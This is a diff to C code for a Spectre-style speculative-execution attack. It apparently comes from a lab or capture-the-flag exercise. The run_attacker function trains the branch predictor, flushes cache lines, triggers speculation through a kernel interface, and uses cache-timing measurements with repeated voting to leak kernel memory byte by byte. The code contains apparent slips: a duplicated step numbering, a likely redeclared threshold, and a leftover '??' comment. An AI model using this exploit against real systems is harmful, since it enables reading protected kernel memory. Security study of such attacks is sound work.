@@ -58,21 +58,48 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         clflush(&shared_memory[0]);
 
         // Step 3: Flush shared memory
-        for (int i = 0; i < 256; i++) {
-            clflush(&shared_memory[i * 4096]);
-        }
+        const uint64_t CACHE_HIT_THRESHOLD = 80;
+        int counts[256] = {0};
+        const int max_attempts = 100;
 
-        // Step 4: Trigger speculative execution
-        call_kernel_part3(kernel_fd, shared_memory, current_offset);
+        for (int attempt = 0; attempt < max_attempts; attempt++) {
+            // Step 1: Train branch predictor
+            for (int train = 0; train < 40; train++) {
+                call_kernel_part3(kernel_fd, shared_memory, 0);
+            }
 
-        // Step 5: Measure access times
-        for (int i = 0; i < 256; i++) {
-            uint64_t access_time = time_access(&shared_memory[i * 4096]);
-            if (access_time < CACHE_HIT_THRESHOLD) {
-                leaked_byte = (char)i;
-                break;
+            // Step 2: Flush memory to extend speculation window
+            clflush(&shared_memory[0]);
+
+            // Step 3: Flush shared memory pages
+            for (int i = 0; i < 256; i++) {
+                clflush(&shared_memory[i * 4096]);
+            }
+
+            // Step 4: Trigger speculative execution
+            call_kernel_part3(kernel_fd, shared_memory, current_offset);
+
+            // Step 5: Measure cache hit times
+            for (int i = 0; i < 256; i++) {
+                uint64_t time = time_access(&shared_memory[i * 4096]);
+                if (time < CACHE_HIT_THRESHOLD) {
+                    counts[i]++;
+                }
             }
         }
+
+        // Find most frequent result
+        int best_guess = -1;
+        int best_count = 0;
+        for (int i = 0; i < 256; i++) {
+            if (counts[i] > best_count) {
+                best_count = counts[i];
+                best_guess = i;
+            }
+        }
+
+        char leaked_byte = best_guess;
+        // leaked_byte = ??
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
